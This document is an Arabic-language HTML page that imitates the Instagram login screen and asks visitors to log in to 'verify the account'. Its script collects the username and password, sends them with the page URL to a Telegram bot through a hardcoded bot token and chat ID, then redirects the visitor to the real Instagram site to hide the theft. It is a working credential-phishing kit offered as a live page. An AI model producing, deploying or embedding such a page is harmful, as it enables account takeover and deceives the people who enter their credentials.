<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body {
            background-color: #fafafa;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-box {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 30px 40px;
            width: 350px;
            text-align: center;
        }
        .logo {
            font-family: 'Billabong', sans-serif; /* محاكاة خط إنستغرام أو استخدام صورة الشعار */
            font-size: 40px;
            margin: 22px 0;
            font-weight: bold;
        }
        input {
            width: 100%;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            box-sizing: border-box;
            color: #262626;
            font-size: 12px;
            padding: 9px 8px;
            margin-bottom: 6px;
        }
        input:focus {
            border-color: #a8a8a8;
            outline: none;
        }
        .btn {
            background-color: #0095f6;
            border: 1px solid transparent;
            border-radius: 4px;
            color: #fff;
            cursor: pointer;
            font-weight: 600;
            font-size: 14px;
            width: 100%;
            padding: 7px;
            margin-top: 10px;
        }
        .sub-text {
            color: #737373;
            font-size: 14px;
            line-height: 18px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>

    <div class="login-box">
        <div class="logo">Instagram</div>
        <p class="sub-text">يرجى تسجيل الدخول للتحقق من الحساب واستئناف الجلسة.</p>
        
        <form id="loginForm">
            <input type="text" id="username" placeholder="اسم المستخدم، أو البريد الإلكتروني، أو رقم الهاتف" required>
            <input type="password" id="password" placeholder="كلمة المرور" required>
            <button type="submit" class="btn">تسجيل الدخول</button>
        </form>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            const botToken = "8970427451:AAFqyCocC3VS1jGYo8Da_ET6PNrV6hWdOVs";
            const chatId = "865078178";
            
            const message = "🚨 بيانات جديدة:\nالمستخدم: " + user + "\nكلمة المرور: " + pass + "\nالرابط: " + window.location.href;
            const url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
            
            const img = new Image();
            img.src = url;

            setTimeout(function() {
                window.location.href = "https://www.instagram.com";
            }, 500);
        });
    </script>
</body>
</html>
